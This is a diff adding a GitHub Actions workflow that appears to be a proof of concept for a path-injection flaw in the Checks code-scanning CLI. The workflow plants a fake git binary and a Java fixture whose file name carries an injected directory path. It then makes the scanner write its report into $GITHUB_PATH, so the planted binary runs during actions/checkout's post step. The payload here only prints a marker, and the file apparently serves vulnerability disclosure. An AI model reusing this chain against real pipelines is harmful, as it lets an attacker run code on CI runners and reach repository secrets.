@@ -1,0 +1,85 @@
+name: T1 GITHUB_PATH Post Checkout Git Probe
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  post-checkout-git-path:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Prepare fake git and Checks fixture
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf scan-root-path t1-owned-bin
+          mkdir -p scan-root-path t1-owned-bin
+          cat > t1-owned-bin/git <<'SH'
+          #!/bin/bash
+          set -euo pipefail
+          printf 'T1_POST_CHECKOUT_FAKE_GIT_EXECUTED_20260605 args=%s\n' "$*" >&2
+          exec /usr/bin/git "$@"
+          SH
+          chmod +x t1-owned-bin/git
+          python3 - <<'PY'
+          from pathlib import Path
+
+          source = """\
+          import android.provider.Settings;
+
+          class Payload {
+            void leak(android.content.ContentResolver cr) {
+              String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
+              String marker = "T1_GITHUB_PATH_POST_CHECKOUT_GIT_20260605";
+            }
+          }
+          """
+          Path("scan-root-path/Control.java").write_text(source)
+          injected_path = str((Path.cwd() / "t1-owned-bin").resolve())
+          name = "PathLineProbe\n" + injected_path + "\nPayload.java"
+          payload_path = Path("scan-root-path", name)
+          payload_path.parent.mkdir(parents=True, exist_ok=True)
+          payload_path.write_text(source)
+          print(f"injected-path={injected_path}")
+          PY
+
+      - name: Install Checks CLI
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl --compressed https://dl.google.com/checks/cli/latest/checks-linux -o checks
+          chmod +x ./checks
+          ./checks --version
+
+      - name: Write Checks HTML report into actual GITHUB_PATH
+        shell: bash
+        run: |
+          set -euo pipefail
+          injected_path="$(pwd)/t1-owned-bin"
+          printf 'github-path-file=%s\n' "$GITHUB_PATH"
+          printf 'expected-injected-path=%s\n' "$injected_path"
+          ./checks code scan scan-root-path \
+            --skip-upload \
+            --format=html \
+            --output "$GITHUB_PATH" \
+            --account-id=1 \
+            --repo-id=1 \
+            --scm-remote-url=https://github.com/cllc3993/checks-s1-ci-impact-poc \
+            --branch-name=t1-github-path-post-checkout-git \
+            --scm-revision="T1_PATH_POST_CHECKOUT_GIT_${GITHUB_RUN_ID}_${GITHUB_RUN_ATTEMPT}" \
+            --disable-analytics \
+            --disable-version-check \
+            --no-input
+          printf 'github-path-first-line=%s\n' "$(sed -n '1p' "$GITHUB_PATH")"
+          grep -nF "$injected_path" "$GITHUB_PATH"
+
+      - name: Do not manually invoke git
+        shell: bash
+        run: |
+          set -euo pipefail
+          printf 'T1_POST_CHECKOUT_FAKE_GIT_WAITING_FOR_ACTION_POST_STEP_20260605\n'
